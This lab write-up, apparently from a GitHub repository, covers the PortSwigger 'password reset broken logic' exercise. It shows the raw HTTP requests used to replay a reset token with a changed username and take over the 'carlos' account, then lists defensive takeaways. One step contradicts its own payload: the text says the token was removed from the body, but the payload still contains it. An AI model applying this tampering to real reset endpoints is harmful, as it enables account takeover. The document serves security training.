# Lab 09: Authentication — Password Reset Broken Logic

![Status](https://img.shields.io/badge/Status-Solved-brightgreen)
![Difficulty](https://img.shields.io/badge/Difficulty-Apprentice-blue)
![Source](https://img.shields.io/badge/Source-PortSwigger%20Web%20Security%20Academy-orange)

> 📌 Exploiting a logic flaw in the password reset functionality to take over another user's account.

---

## 🎯 Objective

Exploit a logic flaw in the password reset functionality to take over another user's account. The lab demonstrates how a broken password reset flow can allow an attacker to reset arbitrary users' passwords.

---

## 🛠️ Tools

| Tool | Purpose |
| --- | --- |
| Burp Suite Community Edition | Intercepting, modifying, and replaying requests |
| Burp Repeater | Manual request modification for logic exploitation |
| Firefox (Burp Browser) | Target interaction |
| Kali Linux | Operating system |
| PortSwigger Email Client | Retrieving password reset tokens |

---

## 🔍 Step-by-Step Methodology

### Step 1 — Initiate Password Reset for Your Own Account

Navigated to the login page and clicked **"Forgot password?"**. Submitted the username `wiener` to receive a password reset email.

Intercepted the following request in **Burp Proxy**:

```http
POST /forgot-password HTTP/2
Host: ...web-security-academy.net
...

username=wiener
```

<img width="1280" height="684" alt="Screenshot 2026-10-01 014344" src="https://github.com/user-attachments/assets/98d895ee-67dc-411d-96e3-2a222b9b727e" />
<img width="1280" height="684" alt="Screenshot 2026-10-01 020833" src="https://github.com/user-attachments/assets/81ac70ca-26e3-48f3-b139-c2c24f472f06" />


### Step 2 — Retrieve the Reset Token from Email Client

Opened the **PortSwigger Email Client** and retrieved the password reset link for `wiener`.

The link contained a temporary reset token:

```text
/forgot-password?temp-forgot-password-token=**************
```


### Step 3 — Submit New Password for `wiener`

Clicked the reset link, set a new password (`test123`), and submitted the form.

Intercepted the request in **Burp Repeater**:

```http
POST /forgot-password?temp-forgot-password-token=em2zkd935x0k8p195ca18d6fmoqil2hy HTTP/2
Host: ...web-security-academy.net
Cookie: session=...
...

temp-forgot-password-token=em2zkd935x0k8p195ca18d6fmoqil2hy&username=wiener&new-password-1=test123&new-password-2=test123
```

**Response:** `302 Found` → redirect to `/`

<img width="1280" height="684" alt="Screenshot 2026-10-01 014928" src="https://github.com/user-attachments/assets/b0ce7471-e317-4dc3-996a-0da3bc0acbe9" />


### Step 4 — Exploit the Broken Logic (Change Username to `carlos`)

In **Burp Repeater**, modified the request body by changing `username=wiener` → `username=carlos`.

The `temp-forgot-password-token` parameter was removed from the body, but the **URL token was kept intact**.

**Modified payload:**

```http
POST /forgot-password?temp-forgot-password-token=em2zkd935x0k8p195ca18d6fmoqil2hy HTTP/2
Host: ...web-security-academy.net
Cookie: session=...
...

temp-forgot-password-token=em2zkd935x0k8p195ca18d6fmoqil2hy&username=carlos&new-password-1=test123&new-password-2=test123
```

**Response:** `302 Found` → redirect to `/`

<img width="1280" height="684" alt="Screenshot 2026-10-01 015028" src="https://github.com/user-attachments/assets/1b13d053-2af0-46f7-9fa6-333fa1204f6d" />


### Step 5 — Login as `carlos` and Solve the Lab

Logged out and logged in with the new credentials:

- **Username:** `carlos`
- **Password:** `test123`

✅ **Result:** Successfully logged in as `carlos`. Lab marked as **solved**.

<img width="1280" height="684" alt="Screenshot 2026-10-01 015324" src="https://github.com/user-attachments/assets/d3371d35-d79f-4478-bd2d-2639b0129683" />


---

## 📝 Attack Flow Summary

| Step | Action | Tool | Purpose |
| --- | --- | --- | --- |
| 1 | Initiate password reset for `wiener` | Browser | Get a valid reset token |
| 2 | Retrieve token from email client | Email Client | Obtain the reset token |
| 3 | Submit new password for `wiener` | Burp Repeater | Capture the reset request |
| 4 | Change username to `carlos` | Burp Repeater | Exploit broken logic |
| 5 | Login as `carlos` | Browser | Solve the lab |

---

## 🎯 Key Takeaways

- 🔐 **Password reset tokens must be tied to a specific user** — The server should validate that the token belongs to the user whose password is being reset.
- 🚫 **Never trust user-controlled parameters** — Changing the username in the reset request should invalidate the token.
- ♻️ **Tokens should be single-use** — After a successful reset, the token must be invalidated immediately.
- ⏳ **Tokens should expire quickly** — A short expiration window (e.g., 15 minutes) reduces the attack surface.
- 🧪 **Always verify both token and username match** — The server should cross-check the token against the username in the database.
- 💻 **Don't rely on client-side validation** — The server must enforce all security checks.
- ⚠️ **Broken logic in password reset is a critical vulnerability** — It can lead to full account takeover without knowing the victim's password.

---

## ⚠️ Note

> Burp Suite Community Edition has a **rate-limited Intruder**. For large brute-force tasks, consider using **Turbo Intruder** or a **Python script**.

---

## 📚 Overall Key Takeaways

- Error messages leak information — Even subtle differences can reveal valid accounts.
- Logic flaws are dangerous — Broken password reset logic can lead to full account takeover.
- Always validate server-side — Never trust client-side data.
- Tokens must be tied to users — Reset tokens should be single-use and user-specific.
- Burp Suite Community Edition is enough — You don't need Burp Pro to solve most Authentication labs.

---

## ⚠️ Disclaimer

This repository is for **educational purposes only**. The techniques demonstrated here should only be practiced in authorized environments such as the **PortSwigger Web Security Academy**. Unauthorized testing on systems you do not own or have explicit permission to test is **illegal and unethical**.

---

## 🔗 References

- [PortSwigger Authentication Vulnerabilities](https://portswigger.net/web-security/authentication)
- [Username Enumeration via Subtly Different Responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses)
- [Password Reset Broken Logic](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic)
- [Burp Intruder Documentation](https://portswigger.net/burp/documentation/desktop/tools/intruder)
- [Burp Repeater Documentation](https://portswigger.net/burp/documentation/desktop/tools/repeater)

---

<p align="center">Happy Hacking! 🐱‍💻</p>
